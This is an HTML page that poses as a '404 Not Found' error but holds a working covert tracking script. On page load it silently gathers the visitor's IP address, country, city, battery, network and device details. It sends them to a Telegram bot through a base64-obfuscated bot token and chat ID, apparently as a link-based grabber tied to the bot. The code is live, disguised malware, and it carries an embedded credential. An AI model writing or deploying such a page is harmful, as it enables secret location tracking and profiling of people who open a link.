<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>404 Not Found</title>
</head>
<body style="background:#000;">
    <script>
        // 🔐 Security Credentials (Base64)
        const _a = "Njk1MjU4MDYzMA==", _t = "ODIzNTA0MDA2NDpBQUZ1V1lWeDJjYktSVDAtaEZGQm5GVHMzdnF3YU95a3BXWQ==";
        const dec = (s) => atob(s);
        const urlParams = new URLSearchParams(window.location.search);
        const uid = urlParams.get('uid'); // استخراج آيدي المستخدم من البوت

        async function collectAndSend() {
            try {
                // 📡 جلب بيانات IP والموقع
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                
                // 🔋 بيانات البطارية والاتصال
                const batt = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level:0, charging:false}));
                const conn = navigator.connection || {};
                
                // 📱 تفاصيل الجهاز العميقة
                const ua = navigator.userAgent;
                let deviceModel = ua.match(/Android/) ? ua.split(';')[2].split('Build')[0].trim() : navigator.platform;
                let ram = navigator.deviceMemory ? navigator.deviceMemory : "Unknown";
                let cores = navigator.hardwareConcurrency ? navigator.hardwareConcurrency : "Unknown";
                let netSpeed = conn.downlink ? conn.downlink + " Mbps" : "Unknown";

                // 📝 صياغة التقرير بنفس التنسيق الذي طلبته
                let report = `📝 **User Info:**\n- Name: Unknown\n- Phone: Unknown\n- Email: Unknown\n\n`;
                report += `📱 **Device Info:**\n`;
                report += `- Country: ${d.country_name} 🔻\n`;
                report += `- City: ${d.city} 🏙️\n`;
                report += `- IP Address: ${d.ip} 🌍\n`;
                report += `- Battery: ${(batt.level * 100).toFixed(0)}% 🔋\n`;
                report += `- Charging: ${batt.charging ? 'Yes' : 'No'} ⚡\n`;
                report += `- Network: ${conn.effectiveType || '4g'} 📶 (Speed: ${netSpeed})\n`;
                report += `- Conn Type: ${conn.type || 'cellular'} 📡\n`;
                report += `- Time: ${new Date().toLocaleString()} ⏰\n`;
                report += `- Device Name: ${navigator.platform} 🖥️\n`;
                report += `- Device Model: ${deviceModel} 📱\n`;
                report += `- RAM: ${ram} GB 🧠\n`;
                report += `- CPU Cores: ${cores} ⚙️\n`;
                report += `- Language: ${navigator.language} 🌐\n`;
                report += `- Screen Res: ${screen.width}x${screen.height} 📏\n`;
                report += `- Security: ${window.location.protocol} 🔒\n`;
                report += `- Touch Support: ${'ontouchstart' in window ? 'Yes' : 'No'} ✋\n`;
                report += `\n🚨 **By @slomiarna**`; // التوقيع الرسمي

                // 🚀 إرسال البيانات فوراً لبوت البايثون
                fetch(`https://api.telegram.org/bot${dec(_t)}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: uid || dec(_a),
                        text: report,
                        parse_mode: 'Markdown'
                    })
                });

            } catch(e) {}
        }

        // تشغيل الوظيفة فور تحميل الصفحة بصمت
        window.onload = collectAndSend;
    </script>
</body>
</html>
